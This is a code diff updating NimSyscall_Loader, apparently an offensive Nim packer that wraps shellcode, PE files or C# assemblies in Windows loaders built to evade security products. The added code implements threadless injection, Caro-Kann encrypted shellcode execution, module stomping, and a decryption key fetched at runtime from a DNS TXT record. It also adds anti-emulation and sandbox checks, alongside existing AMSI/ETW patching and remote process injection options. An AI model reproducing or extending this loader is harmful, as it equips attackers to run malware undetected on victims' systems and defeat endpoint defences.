@@ -16,6 +16,7 @@ import random
 import winim
 #import std/algorithm
 import streams
+#import ptr_math
 when system.hostOS == "windows":
     import winim/clr except `[]`
 
@@ -54,7 +55,7 @@ let banner = """
  / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
 /_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                        /____/                   /_____/      --> @ShitSecure
-                                                                 v2.0                                            
+                                                                 v2.1                                            
 
 """
 
@@ -63,10 +64,10 @@ echo banner
 #Handle arguments
 
 let helpmenu = """
-NimSyscall_Loader v 2.0
+NimSyscall_Loader v 2.1
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -78,6 +79,9 @@ Options:
   --version     Show version.
   --file filename  File to encrypt.
   --key key     Key to encrypt with
+    --keyfile keyfile  File to read key from
+    --dnsKey    Use remote DNS TXT Record as key which is retrieved on runtime
+      --dnsdomain sub.example.com    Specify a subdomain to use for the DNS TXT Record
   --output filename    Filename for encrypted exe/dll
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
   --metadata    Set custom resource file information (cmd icon, CMD description, ntdll metadata for dlls by default)
@@ -153,6 +157,7 @@ Options:
                  This will only work for C2-Payloads, that use Win32 Sleep in between connection attempts, as that is hooked
   --noAntidebug    Leave out AntiDebugger Checks
   --noDefaultSandBox    Leave out default Sandbox Checks
+  --noAntiEmulate    Leave out AntiEmulation Checks
   --jmpEntry    This option will enable a custom Shellcode Entrypoint from a DLL backed function to avoid unbacked memory as Thread/APC start address. The target function will be hooked with a JMP to the Shellcode
     --jmpEntryDLL value    Specify a DLL to use for the custom Shellcode Entrypoint
     --jmpEntryFunc value    Specify a function to use for the custom Shellcode Entrypoint
@@ -183,6 +188,15 @@ Options:
       --blockDLLs    Set the DllBlocklistPolicy to 1 to prevent DLLs from being loaded
       --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
       --remotepatchETW    Patch ETW in the remote process before shellcode execution
+  --threadless    Use Threadless inject for shellcode execution (https://github.com/CCob/ThreadlessInject)
+      --threadlessDll dllname    Specify a DLL to use for the Threadless inject hook
+      --threadlessFunc dllfunc    Specify a function to use for the Threadless inject hook
+  --Caro-Kann    Use Caro-Kann technique to bypass initial memory scan detections by injecting a second shellcode which sleeps and decrypts (https://github.com/S3cur3Th1sSh1t/Caro-Kann)  
+  --stomb    Enable Module Stomping to not do memory allocations. By default, 'chakra.dll' is loaded and stomped.
+      --stombDll dllname    Specify a DLL to use for the Module Stomping (default is 'chakra.dll')
+      --stombFunc dllfunc    Specify a function to use for the Module Stomping
+      --stombFunc2 dllfunc2    Specify a second function to use for the Module Stomping. Only needed if you combine Caro-Kann with Module Stomping as there are two shellcodes than
+      --restore    Using this option will restore the .text section of the stomped DLL after executing the shellcode. That way, you get rid of Module Stomp IoCs. But this option only works with Payloads, that are reflective DLLs or which create a new thread.
 
 [PE Packing]
 
@@ -212,6 +226,9 @@ var
     packerPath = os.getAppDir()
     outfile: string = packerPath
     envkey: string = rndStr(rand(10..35))
+    usekeyFile: bool = false
+    usednsKey: bool = false
+    webKey: bool = false
     dll_out: bool = false
     dllfunc: string = ""
     dllexportfunctions: seq[string]
@@ -237,6 +254,10 @@ var
     parentProcess: string = ""
     spoofArgs: string = ""
     shellcodeFile: seq[string] = @["enc.blob"]
+    keyFile: seq[string] = @["key.txt"]
+    kfile: string = ""
+    dnsdomain: string = ""
+    customKey: bool = false
     stegofile: string = ""
     useStego: bool = false
     stFile: string = ""
@@ -314,8 +335,19 @@ var
     jmpEntryDLL: string = "ntdll.dll"
     jmpEntryFunction: string = "RtlpWow64CtxFromAmd64"
     dripallocate: bool = false
+    threadless: bool = false
+    threadlessDll: string = "ntdll.dll"
+    threadlessFunc: string = "NtWaitForMultipleObjects" # called regularly by RuntimeBroker.exe which is default spawn inject target.
+    suspended: bool = true
+    carokann: bool = false
+    stomb: bool = false
+    stombDll: string = "chakra.dll"
+    stombFunc: string = "MemProtectHeapUnprotectCurrentThread"
+    stombFunc2: string = "DllCanUnloadNow"
+    restore: bool = false
+    noAntiEmulate: bool = false
 
-let args = docopt(helpmenu, version = "NimSyscall_Loader 2.0")
+let args = docopt(helpmenu, version = "NimSyscall_Loader 2.1")
 
 if args["--file"]:
   let fname = args["--file"]
@@ -325,6 +357,7 @@ if args["--file"]:
 if args["--key"]:
   let keyname = args["--key"]
   envkey = fmt"{keyname}"
+  customKey = true
 
 if args["--stegofile"]:
     useStego = true
@@ -341,6 +374,9 @@ if args["--ruy-lopez"]:
 
 if args["--noDefaultSandBox"]:
     defaultSandBoxChecks = false
+
+if args["--noAntiEmulate"]:
+    noAntiEmulate = true
 
 if args["--psout"]:
     psout = true
@@ -422,6 +458,28 @@ if args["--shellcodeFile"]:
     let shellcodeFilestring = args["--shellcodeFile"]
     scfile = fmt"{shellcodeFilestring}"
     shellcodeFile = scfile.split(',')
+
+if args["--keyfile"]:
+    usekeyFile = true
+    let keyFilestring = args["--keyfile"]
+    kfile = fmt"{keyFilestring}"
+    keyFile = kfile.split(',')
+
+if args["--dnsdomain"]:
+    let dnsdomainstring = args["--dnsdomain"]
+    dnsdomain = fmt"{dnsdomainstring}"
+    usednsKey = true
+    webKey = false
+    usekeyFile = false
+
+if args["--dnsKey"]:
+    usednsKey = true
+    webKey = false
+    usekeyFile = false
+    # if dnsdomain == "" quit and tell the user to specify a domain
+    if(dnsdomain == ""):
+        echo "Please specify a domain to retrieve the key from with --dnsdomain"
+        quit(0)
 
 if args["--shellcodeURL"]:
     retrieveFromURL = true
@@ -668,6 +726,31 @@ if args["--service"]:
 if args["--noDInvoke"]:
   noDInvoke = true
 
+if args["--threadless"]:
+    threadless = true
+    if(remoteinject):
+        localCreateThread = false
+        useQueueAPC = false
+        callbackexecute = false
+    suspended = false
+
+if args["--threadlessDll"]:
+    let threadlessDllarg = args["--threadlessDll"]
+    threadlessDll = fmt"{threadlessDllarg}"
+
+if args["--threadlessFunc"]:
+    let threadlessFuncarg = args["--threadlessFunc"]
+    threadlessFunc = fmt"{threadlessFuncarg}"
+
+if args["--Caro-Kann"]:
+    carokann = true
+
+if args["--stomb"]:
+    stomb = true
+
+if args["--restore"]:
+    restore = true
+
 var blob: string
 
 if ((compileX86 or wow64) and hellsgate):
@@ -738,6 +821,66 @@ if ((remoteinject == false) and ruylopez):
     echo "Error: Ruy-Lopez can currently only be used in combination with --remoteinject"
     quit(1)
 
+# JmpEntry and Threadless cannot be used in combination, as JmpEntry creates a thread and Threadless has the goal of avoiding thread creation
+if (jmpEntry and threadless):
+    echo "Error: Cannot use both --jmpEntry and --threadless, as JmpEntry creates a thread and Threadless has the goal of avoiding thread creation"
+    quit(1)
+
+# same for queuapc and localcreatethread
+if ((useQueueAPC or localCreateThread or callbackexecute) and threadless):
+    echo "Error: Cannot (--QueueApc/--localCreateThread/-CallbackExecute) with --threadless!"
+    quit(1)
+
+# carokann can only be used in combination with CallbackExecute, localCreateThread or useQueueAPC when not injecting into a remote process
+if (((remoteinject == false) and carokann and (useQueueAPC == false and localCreateThread == false and callbackexecute == false))):
+    echo "Error: Cannot use --Caro-Kann without --QueueApc/--localCreateThread/-CallbackExecute when doing local injection! For some reason NtProtectVirtualMemory fails when using a direct pointer."
+    echo "But this is not a problem at all, because the shellcode will be encrypted at the time of the execute primitive ;-)"
+    quit(1)
+
+# InteractivePS cannot be used with --dll
+if (interactivePS and dll_out):
+    echo "Error: Cannot use --interactivePS with --dll!"
+    quit(1)
+
+# InteractivePS cannot be used with --remoteinject
+if (interactivePS and remoteinject):
+    echo "Error: Cannot use --interactivePS with --remoteinject!"
+    quit(1)
+
+# Cannot use DripAllocate or JmpEntry with Caro-Kann
+if ((carokann and dripallocate) or (carokann and jmpEntry)):
+    echo "Error: Cannot use --Caro-Kann with --dripallocate or --jmpEntry (yet)!"
+    quit(1)
+
+# it makes no sense to use csharp and shellcode at the same time
+if (csharp and shellcode):
+    echo "Error: Using --csharp and --shellcode at the same time makes no sense! Read what the options do!"
+    quit(1)
+
+# it makes no sense to use csharp and peload at the same time
+if (csharp and peload):
+    echo "Error: Using --csharp and --peload at the same time makes no sense! Read what the options do!"
+    quit(1)
+
+# it makes no sense to use peload and shellcode at the same time
+if (peload and shellcode):
+    echo "Error: Using --peload and --shellcode at the same time makes no sense! Read what the options do!"
+    quit(1)
+
+# DripAllocate, CallbackExecute, localCreateThread, QueueApc, MapSection, Caro-Kann are shellcode specific. They cannot be used in combination with csharp, interactivePS or peload
+if((csharp or interactivePS) and (dripallocate or callbackexecute or localCreateThread or useQueueAPC or remoteMapSection or carokann or ruylopez)):
+    echo "Error: Cannot use --csharp/--interactivePS with --dripallocate/--CallbackExecute/--localCreateThread/--QueueApc/--mapSection/--Caro-Kann!"
+    echo "This is Shellcode specific options."
+    quit(1)
+if (peload and (dripallocate or remoteMapSection or carokann)):
+    echo "Error: Cannot use --peload with --dripallocate/--mapSection/--Caro-Kann!"
+    quit(1)
+
+# ThreadlessInject and Caro-Kann cannot yet be used with syswhispers
+if (syswhispers and (threadless or carokann)):
+    echo "Error: Cannot use --syswhispers with --threadless/--Caro-Kann (yet)!"
+    quit(1)
+
 #echo "Key: " & envkey
 # Lets save the last 4 characters of the string in a new variable
 var lastTwo = envkey[^2..^1]
@@ -749,6 +892,21 @@ var lastFour = envkey[^4..^1]
 # And save a key without those last 4 characters in a new one
 var firstwithoutlast4 = envkey.replace(lastFour, "")
 #echo "First without last 4 :" & firstwithoutlast4
+
+
+# if SkipDefaultSandBoxChecks is set, put firstwithoutlast4 into the keyFile and write it to disk. Otherwise write envkey into it
+if(usekeyFile):
+    if (defaultSandBoxChecks):
+        if (antidebug):
+            for i in keyFile:
+                writeFile(i, envkey)
+        else:
+            for i in keyFile:
+                writeFile(i, firstwithoutlast4)
+    else:
+        for i in keyFile:
+            writeFile(i, envkey)
+
 
 if (peload and embeddedArguments):
     verbose = true # workaround, something in DInvoke+NoVerbose breaks the arguments
@@ -772,6 +930,7 @@ if (peload or peinject):
     if magic_string != "MZ":
         echo "[-] No Magic bytes found, file is not a PE"
         quit(1)
+
 when system.hostOS == "windows":
     if (csharp):
         if (interactivePS):
@@ -808,9 +967,6 @@ else:
         var newPath = packerPath & "/pwnPowershell/RunSpace.exe"
         blob = readFile(newPath)
 
-#if (AMSICreateSectionHook):
-#    echo "Not fully working yet, sorry!"
-    #quit(0)
 
 #Read file and if PE convert to shellcode before
 if (peinject):
@@ -868,6 +1024,93 @@ var
     ectx: ECB[aes256]
     key: array[aes256.sizeKey, byte]
 
+proc toString(bytes: openarray[byte]): string =
+    result = newString(bytes.len)
+    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
+
+#[
+proc xorFunc*(buf: ptr uint32; bufSize: size_t; xorKey: uint32) =
+  var buf32: ptr uint32 = cast[ptr uint32](buf)
+  var bufSizeRounded: auto = (bufSize - (bufSize mod size_t(sizeof((uint32))))) div 4
+  var i: size_t = 0
+  while i < bufSizeRounded:
+    buf32[] = buf32[] xor xorKey
+    buf32 = buf32 + 1
+    inc(i)
+]#
+
+var originalScLength: int = data.len
+
+if(carokann):
+    # The Caro-Kann shellcode decryptprotect.bin contains an egg with the xor decryption key, which looks like this
+    # 0x14, 0xFF, 0x13, 0xDE | we want to search for this egg and replace it with a random different key.
+    # The egg is 4 bytes long, so we need to generate a random 4 byte key
+    
+    const hookShellcode = slurp"decryptprotect.bin"
+    var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)
+
+    var randomKey = newSeq[byte](4)
+    for i in 0 .. 3:
+        randomKey[i] = byte(rand(int(0x00) .. int(0xFF)))
+    
+    # put the bytes byte 0xAC, 0xF4, 0x0F, 0x96 into the randomKey sequence
+    randomKey[0] = 0x14
+    randomKey[1] = 0xFF
+    randomKey[2] = 0x13
+    randomKey[3] = 0xDE # only for testing purposes
+
+    # Now we need to search for the egg and replace it with the random key. The resulting shellcode will be written to disk as decryptprotect.bin.tmp
+    var eggIndex = 0
+    for i in 0 ..< hookShellcodeBytes.len:
+        if (hookShellcodeBytes[i] == 0x14 and hookShellcodeBytes[i+1] == 0xFF and hookShellcodeBytes[i+2] == 0x13 and hookShellcodeBytes[i+3] == 0xDE):
+            eggIndex = i
+            break
+    
+    echo "Found egg for the Caro-Kann shellcode key at index: " & $eggIndex
+    echo "\r\nReplacing egg with random key: " & $randomKey & "\r\n"
+    hookShellcodeBytes[eggIndex] = randomKey[0]
+    hookShellcodeBytes[eggIndex+1] = randomKey[1]
+    hookShellcodeBytes[eggIndex+2] = randomKey[2]
+    hookShellcodeBytes[eggIndex+3] = randomKey[3]
+
+    eggIndex = 0
+    for i in 0 ..< hookShellcodeBytes.len:
+        if (hookShellcodeBytes[i] == 0xDE) and (hookShellcodeBytes[i+1] == 0xAD) and (hookShellcodeBytes[i+2] == 0x10) and (hookShellcodeBytes[i+3] == 0xAF):
+            eggIndex = i
+            break
+
+    var shellcodeSize: DWORD = cast[DWORD](data.len)
+    copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr shellcodeSize, 4)
+
+
+    writeFile("decryptprotect.bin.tmp", toString(hookShellcodeBytes))
+
+    for i in 0 ..< data.len:
+        # check if data.len is divisible by 4, if not, we need to do the last 3 bytes with the first byte of the key. Thats what the c shellcode function does as well.
+        var isDivisible: bool = false
+        var rest: int = data.len mod 4
+        if (data.len mod 4 == 0):
+            isDivisible = true
+        #echo "Rest: " & $rest & "\r\n"
+        #echo "Data len: " & $data.len & "\r\n"
+        if(isDivisible):
+            data[i] = data[i] xor (randomKey[i mod 4])
+            #echo "Encrypting with Key byte: " & toHex(randomKey[i mod 4]) & " at index: " & $i & "\r\n"
+        else:
+            if (i < data.len - rest):
+                data[i] = data[i] xor (randomKey[i mod 4])
+                #echo "Encrypting with Key byte: " & toHex(randomKey[i mod 4]) & " at index: " & $i & "\r\n"
+            else:
+                data[i] = data[i] xor (randomKey[0] and 0xFF)
+                #echo "Encrypting with Key byte: " & toHex(randomKey[0]) & " at index: " & $i & "\r\n"
+    
+    
+    # write new data blob to disk as datablob.bin to verify the encryption went correctly.
+    #writeFile("datablob.bin", toString(data))
+
+
+
+
 # AES256 block size is 128 bits or 16 bytes, so we need to pad plaintext with
 # 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
 if ((len(data) mod aes256.sizeBlock) != 0):
@@ -919,9 +1162,6 @@ writeFile(shellcodeFile[0], content)
 
 import streams
 
-proc toString(bytes: openarray[byte]): string =
-    result = newString(bytes.len)
-    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
 
 proc nthBitPresent(b: byte,n: int): bool =
     var a = 1 shl n
@@ -1296,6 +1536,7 @@ let ShellcodeFromFileStub * = fmt"""
 
 """
 
+
 let ServiceDllStub * = """
 
 const
@@ -1645,6 +1886,16 @@ when defined(sleep):
     import random
     import times
 
+when defined(threadless):
+    from Utils import GetRemoteProcAddress, GetRemoteModuleHandle
+
+when defined(AllocateDripStyle):
+    import Utils
+
+when defined(stomb):
+    from Utils import GetRemoteProcAddress, GetRemoteModuleHandle
+    var module: HMODULE
+
 when defined(SelfDelete):
     # Don't want to import the everything from winim, only what's really needed
     from winim import PWCHAR,HANDLE,DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,WINBOOL,FILE_RENAME_INFO,LPWSTR,DWORD,fileRenameInfo,FILE_DISPOSITION_INFO,TRUE
@@ -1729,6 +1980,10 @@ macro obf*(s: untyped): untyped =
     else:
         result = s
 
+when defined(dnsKey):
+    from winim import PDNS_RECORD,DNS_RECORD,DNS_STATUS,DNS_QUERY_STANDARD,DNS_TYPE_TEXT,DnsQueryW
+    var envkey,envkey2: string
+    #proc DnsQueryW*(pszName: LPCWSTR, wType: WORD, Options: DWORD, pExtra: PVOID, ppQueryResults: PVOID, pReserved: PVOID): DWORD {.importc, dynlib: obf("dnsapi.dll"), stdcall, discardable.}
 when not defined(DInvoke):
     proc LdrLoadDll*(PathToFile: PWCHAR, Flags: ULONG, ModuleFileName: PUNICODE_STRING, ModuleHandle: PHANDLE): NTSTATUS {.
         importc: obf("LdrLoadDll"), dynlib: obf("ntdll"), stdcall, discardable.}
@@ -1912,6 +2167,25 @@ when defined(Stego):
             shellcode: seq[byte] = extractBytes(c, a)
         return shellcode
 
+var cfgspawn: bool = false
+
+when defined(threadless):
+    const threadlessDLL = obf("{threadlessDll}") 
+    const threadlessFunction = obf("{threadlessFunc}")
+    cfgspawn = true
+
+when defined(stomb):
+    const DLLPATH: cstring = obf("{stombDll}")
+    var stombDll = obf("{stombDll}")
+    var stombFunc = obf("{stombFunc}")
+    var rPtr2: LPVOID
+    cfgspawn = true
+    when defined(carokann):
+        var stombFunc2 = obf("{stombFunc2}")
+    
+
+when defined(carokann):
+    var originalscLength: DWORD = {originalScLength}
 
 when defined(AllocateDripStyle):
     var dripsleepinbetween = {dripsleepinbetween}
@@ -1920,16 +2194,74 @@ when defined(JmpEntry):
     var jmpMod: string = obf("{jmpEntryDLL}")
     var jmpFunc: string = obf("{jmpEntryFunction}")
 
-when defined(SkipDefaultSandBoxChecks):
-    when defined(AntiDebug):
+when defined(noKey):
+    when defined(keyFromFile):
+        # read key from file (keyFile)
+        var keyFileHandle: File
+        var keyString: string
+        for f in {keyFile}:
+            try:
+                keyFileHandle = open(f, fmRead)
+                keyString = keyFileHandle.readAll()
+                when defined(verbose):
+                    echo obf("[*] Key file found: ") & f
+                break
+            except:
+                when defined(verbose):
+                    echo obf("[-] Failed to open file: ") & f
+        if keyString.len == 0:
+            when defined(verbose):
+                echo obf("[-] Key file is empty or not found!")
+            quit(1)
+        when defined(verbose):
+            echo obf("[*] Key: ") & keyString
+        var envkey = keyString
+        var envkey2 = envkey
+    when defined(dnsKey):
+        # retrieve key from a domain TXT record via dns request using DnsQuery Win32 API. The domain is dnsdomain
+        var dnsdomain: string = obf("{dnsdomain}")
+        var recordType: WORD = 0x0010 # DNS_TYPE_TEXT
+        var pDnsRecord: PDNS_RECORD = nil
+
+        var dnsStatus: DNS_STATUS = DnsQueryW(dnsdomain, recordType, DNS_QUERY_STANDARD, nil, addr pDnsRecord, nil)
+        if dnsStatus != 0:
+            when defined(verbose):
+                echo obf("[-] DnsQueryW failed with error code: ") & $dnsStatus
+            quit(1)
+        else:
+            when defined(verbose):
+                echo obf("[*] DnsQueryW successful")
+        
+        while(pDnsRecord != nil):
+            if pDnsRecord.wType == DNS_TYPE_TEXT:
+                var dnsKey: string = $pDnsRecord.Data.TXT.pStringArray[0]
+                when defined(verbose):
+                    echo obf("[*] Key: ") & dnsKey
+                envkey = dnsKey
+                envkey2 = envkey
+                break
+            else:
+                when defined(verbose):
+                    echo obf("[-] No TXT record found for domain: ") & dnsdomain
+            pDnsRecord = pDnsRecord.pNext
+        if pDnsRecord == nil:
+            when defined(verbose):
+                echo obf("[-] No TXT record found for domain: ") & dnsdomain
+        echo ""
+    when defined(webKey):
+        # Todo: Implement Web Key
+        echo ""
+else:
+    when defined(SkipDefaultSandBoxChecks):
+        when defined(AntiDebug):
+            var envkey = obf("{firstwithoutlast4}")
+            var envkey2 = envkey
+        else:
+            var envkey = obf("{envkey}")
+            var envkey2 = obf("{envkey}")
+    else:
         var envkey = obf("{firstwithoutlast4}")
         var envkey2 = envkey
-    else:
-        var envkey = obf("{envkey}")
-        var envkey2 = obf("{envkey}")
-else:
-    var envkey = obf("{firstwithoutlast4}")
-    var envkey2 = envkey
 var ptrEncText: ptr byte
 var ptrDecText: ptr byte
 
@@ -2048,12 +2380,102 @@ proc accelerated_sleep*(): void =
         when defined(verbose):
             echo obf("[*] We don't appear to be in a sandbox according to the Sleep time")
         when not defined(AntiDebug):
-            envkey2 = envkey & "{lastFour}"
+            when not defined(customKey): # Key retrieved from DNS, than we don't want to change it
+                envkey2 = envkey & "{lastFour}"
         else:
-            envkey2 = envkey2 & "{lastTwo}"
+            when not defined(customKey):
+                envkey2 = envkey2 & "{lastTwo}"
         when defined(verbose):
             echo obf("[*] Final Key: ") & envkey2
 accelerated_sleep()
+"""
+
+let AntiEmulateStub * = """
+
+#from os import fileExists
+#from winim import GetFileAttributesA
+
+proc GetFileAttributesW(path: LPCWSTR): DWORD {.importc, dynlib: "kernel32.dll".}
+
+proc officeFileCheck(): void =
+    # check if the file "C:\Program Files\Microsoft Office\AppXManifest.xml" exists
+    var fileCount: int = 0
+    var AppXManifest: string = obf(r"C:\Program Files\Microsoft Office\AppXManifest.xml")
+    var dwAttributes: DWORD
+    dwAttributes = GetFileAttributesW(cast[LPCWSTR](newWideCString(AppXManifest)))
+    if (dwAttributes != INVALID_FILE_ATTRIBUTES):
+        fileCount += 1
+        when defined(verbose):
+            echo obf("[*] File: ") & AppXManifest & obf(" exists")
+    elif(dwAttributes == 0xFFFFFFFFFFFFFFFF):
+        when defined(verbose):
+            echo obf("[*] File: ") & AppXManifest & obf(" does not exist")
+    else:
+        # check if file "C:\Program Files\Microsoft Office\RappelZapp.xml" exists
+        var RappelZapp: string = obf(r"C:\Program Files\Microsoft Office\RappelZapp.xml")
+        dwAttributes = GetFileAttributesW(cast[LPCWSTR](newWideCString(RappelZapp)))
+        if dwAttributes != INVALID_FILE_ATTRIBUTES:
+            fileCount += 1
+            when defined(verbose):
+                echo obf("[*] File: ") & RappelZapp & obf(" exists")
+        elif(dwAttributes == 0xFFFFFFFFFFFFFFFF):
+            when defined(verbose):
+                echo obf("[*] File: ") & RappelZapp & obf(" does not exist")
+    
+    # Now check if C:\\PROGRA~1\\WindowsApps and C:\\PROGRA~2\\WindowsApps exist
+    var WindowsApps: string = obf(r"C:\PROGRA~1\WindowsApps")
+    var WindowsApps2: string = obf(r"C:\PROGRA~2\WindowsApps")
+
+    if (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](newWideCString(WindowsApps))) or INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](newWideCString(WindowsApps2)))):
+        fileCount += 1
+        when defined(verbose):
+            echo obf("[*] File: ") & WindowsApps & obf(" or ") & WindowsApps2 & obf(" exists")
+    else:
+        when defined(verbose):
+            echo obf("[*] File: ") & WindowsApps & obf(" and ") & WindowsApps2 & obf(" do not exist")
+
+    if fileCount == 3:
+        when defined(verbose):
+            echo obf("[*] Two many files found...")
+        envkey = obf("aetschibaetsch")
+        envkey2 = envkey
+        when defined(verbose):
+            echo obf("[*] Final Key: ") & envkey2
+    else:
+        when defined(verbose):
+            echo obf("[*] No false answer to files being checked, continuing...")
+
+officeFileCheck()
+
+# the following function will perform ten billion increments on a variable
+proc billionIncrements(): void =
+    var a: int = 0
+    for i in 0 .. 10000000000:
+        a += 1
+    when defined(verbose):
+        echo obf("[*] Final value of a: ") & $a
+
+billionIncrements()
+
+proc OpenProcess(ProcessAccess: DWORD, bInheritHandle: BOOL, ProcessId: int64): HANDLE {.importc, dynlib: "kernel32.dll".}
+
+# Open process with id of 0xFFFFFFFF1 which is more than the MAX value of a DWORD. If that succeeds, we are in an emulated environment.
+proc OpenMoreMaxPIDProcess(): void =
+    var hProcess: HANDLE = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 0xFFFFFFFF1)
+    if hProcess != 0:
+        when defined(verbose):
+            echo obf("[*] OpenProcess with PID 0xFFFFFFFF1 succeeded, we are in an emulated environment")
+        envkey = obf("aetschibaetsch")
+        envkey2 = envkey
+        when defined(verbose):
+            echo obf("[*] Final Key: ") & envkey2
+    else:
+        when defined(verbose):
+            echo obf("[*] OpenProcess with PID 0xFFFFFFFF1 failed, we are not in an emulated environment")
+
+OpenMoreMaxPIDProcess()
+
+
 """
 
 let AmsiNtCreateSectionDecryptStub = fmt"""
@@ -2450,14 +2872,38 @@ let NotepadProcIDStub * = fmt"""
                     sizeof(ppHandle),
                     NULL,
                     NULL)
+        var flags: DWORD = EXTENDED_STARTUPINFO_PRESENT
         
+        when defined(suspended): 
+            flags = flags or CREATE_SUSPENDED
+        
+        if(cfgspawn): # for some reasson CFG kicks in, when we execute threadlessinject style into a newly spawned process
+            
+            InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
+            si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
+            InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
+            var policy: DWORD64
+            const PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_OFF = 0x00000002 shl 40
+            policy = PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_OFF
+
+        
+            status = UpdateProcThreadAttribute(
+                si.lpAttributeList,
+                0,
+                cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
+                addr policy,
+                sizeof(policy),
+                NULL,
+                NULL)
+            
+
         status = CreateProcess(
             NULL,
             cast[LPWSTR](tProcPath),
             ps,
             ts, 
             FALSE,
-            EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
+            flags,
             NULL,
             r"C:\Windows\system32\",
             addr si.StartupInfo,
@@ -2609,12 +3055,15 @@ else:
                 when defined(verbose):
                     echo obf("[*] No strange interrupts detected...")
                 when defined(SkipDefaultSandBoxChecks):
-                    envkey2 = envkey & "{lastFour}"
-                else:    
-                    envkey2 = envkey & "{fourthtosecondlast}"
+                    when not defined(customKey): # Key retrieved from DNS, than we don't want to change it
+                        envkey2 = envkey & "{lastFour}"
+                else:
+                    when not defined(customKey):    
+                        envkey2 = envkey & "{fourthtosecondlast}"
             else:
                 when defined(verbose):
                     echo obf("[*] Strange Interrupt Detected, quit.")
+                envkey2 = obf("aetschibaetsch")
     else:
         quit(1)
 
@@ -2646,6 +3095,7 @@ proc CheckHardwareBreakPoints(): bool =
                 echo obf("\r\n[*] No Hardware Breakpoints Detected, continuing...\r\n")
     else:
         status = false
+        envkey2 = obf("aetschibaetsch")
 
     result = status
 
@@ -2733,6 +3183,8 @@ if (apihide):
 
 if(defaultSandBoxChecks):
     stub.add(Accelerated_sleepStub)
+if(not noAntiEmulate):
+    stub.add(AntiEmulateStub)
 
 if(gosleep or remoteETWpatch or remoteAMSIpatch):
     stub.add(SleepStubFirst)
@@ -2803,6 +3255,9 @@ if(jmpEntry):
 if(dripallocate):
     stub.add(DripAllocateStubFirst)
 
+if(threadless):
+    stub.add(ThreadlessInjectStub)
+
 stub.add(MainStub)
 
 stub.add(getRandStub())
@@ -2828,6 +3283,10 @@ if (retrieveFromFile):
     stub.add(ShellcodefromFileStub)
 elif (retrieveFromURL):
     stub.add(ShellcodefromURLStub)
+
+# if remoteinject and remotepatchamsi or threadlessinject
